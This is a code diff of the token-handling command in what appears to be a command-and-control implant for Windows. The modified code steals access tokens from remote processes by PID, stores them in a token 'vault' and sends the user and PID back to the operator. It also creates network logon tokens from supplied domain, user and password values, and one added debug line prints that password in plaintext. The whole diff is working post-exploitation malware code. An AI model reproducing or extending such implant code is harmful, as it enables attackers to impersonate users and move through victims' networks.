@@ -1196,18 +1196,19 @@ VOID CommandToken( PPARSER Parser )
 
             if ( ! StolenToken )
             {
-                PUTS("[!] Couldn't get remote process token")
-                SEND_WIN32_BACK
+                PUTS( "[!] Couldn't get remote process token" )
                 return;
             }
 
             User       = TokenGetUserDomain( StolenToken, &UserSize );
             NewTokenID = TokenAdd( StolenToken, User, TOKEN_TYPE_STOLEN, TargetPid, NULL, NULL, NULL );
 
-            PRINTF("[^] New Token added to the Vault: %d\n", NewTokenID);
+            PRINTF( "[^] New Token added to the Vault: %d User:[%s]\n", NewTokenID, User );
 
             PackageAddBytes( Package, User, UserSize );
             PackageAddInt32( Package, NewTokenID );
+            PackageAddInt32( Package, TargetPid );
+
             break;
         }
 
@@ -1292,10 +1293,9 @@ VOID CommandToken( PPARSER Parser )
             DWORD  dwUserSize     = 0;
             DWORD  dwPasswordSize = 0;
             DWORD  dwDomainSize   = 0;
-            DWORD  Local          = ParserGetInt32( Parser );
+            PCHAR  lpDomain       = ParserGetBytes( Parser, &dwDomainSize );
             PCHAR  lpUser         = ParserGetBytes( Parser, &dwUserSize );
             PCHAR  lpPassword     = ParserGetBytes( Parser, &dwPasswordSize );
-            PCHAR  lpDomain       = ParserGetBytes( Parser, &dwDomainSize );
             UCHAR  Deli[ 2 ]      = { '\\', 0 };
             HANDLE hToken         = NULL;
             PCHAR  UserDomain     = NULL;
@@ -1307,18 +1307,13 @@ VOID CommandToken( PPARSER Parser )
 
             if ( dwUserSize > 0 && dwPasswordSize > 0 && dwDomainSize > 0 )
             {
-                PRINTF( "Create new token: type:[%s]\n", Local ? "local" : "network" )
-
-                if ( Local )
-                    Type = LOGON32_LOGON_INTERACTIVE;
-                else
-                    Type = LOGON32_LOGON_NEW_CREDENTIALS;
+                PRINTF( "Create new token: Domain:[%s] User:[%s] Password:[%s]", lpDomain, lpUser, lpPassword )
 
                 lpUser[ dwUserSize ]         = 0;
                 lpPassword[ dwPasswordSize ] = 0;
                 lpDomain[ dwDomainSize ]     = 0;
 
-                hToken = TokenMake( Type, lpUser, lpPassword, lpDomain );
+                hToken = TokenMake( lpUser, lpPassword, lpDomain );
                 if ( hToken != NULL )
                 {
                     UserDomain = Instance->Win32.LocalAlloc( LPTR, UserDomainSize );
@@ -1337,9 +1332,10 @@ VOID CommandToken( PPARSER Parser )
                     MemCopy( BufferPassword, lpPassword, dwPasswordSize );
                     MemCopy( BufferDomain,lpDomain, dwDomainSize );
 
-                    TokenAdd( hToken, UserDomain, Local ? TOKEN_TYPE_MAKE_LOCAL : TOKEN_TYPE_MAKE_NETWORK, NtCurrentTEB()->ClientId.UniqueProcess, BufferUser, BufferDomain, BufferPassword );
+                    TokenAdd( hToken, UserDomain, TOKEN_TYPE_MAKE_NETWORK, NtCurrentTEB()->ClientId.UniqueProcess, BufferUser, BufferDomain, BufferPassword );
 
                     PRINTF( "UserDomain => %s\n", UserDomain )
+
                     PackageAddBytes( Package, UserDomain, UserDomainSize );
                 }
             }
